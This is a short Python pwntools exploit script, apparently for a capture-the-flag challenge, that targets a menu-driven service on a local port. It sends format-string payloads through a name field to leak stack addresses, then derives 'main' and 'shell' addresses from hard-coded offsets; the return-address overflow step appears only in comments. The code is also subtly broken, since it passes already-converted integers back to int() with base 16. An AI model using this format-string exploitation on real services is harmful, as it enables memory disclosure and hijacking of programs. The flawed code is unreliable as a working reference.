from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

input('Enter')

def set_name(name):
    global r
    r.recvuntil('> ')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(name)

def show_info():
    global r
    r.recvuntil('> ')
    r.sendline(b'2')

def save_data(data):
    global r
    r.recvuntil('> ')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(data)

stacks = []

for i in range(1, 100):
    payload = '%' + str(i) + '$p\n'
    set_name(payload.encode())
    show_info()
    r.recvuntil(':')
    recv = r.recvuntil('\n')[:-1]
    if recv == b'(nil)':
        stacks += [0]
    else:
        stacks += [int(recv, 16)]

# for i,add in enumerate(stacks):
#     print(i+1, hex(add))

shell_addr = int(stacks[23], 16) + 2101984
main_addr = shell_addr - 2102304
print('main address: {}'.format(format(main_addr, '0x')))
print('shell address: {}'.format(format(shell_addr, '0x')))

# overflow return address
# stacks = [p64(int(stack, 16)) for stack in stacks]
# payload = b''.join(stacks[:19])

r.interactive()
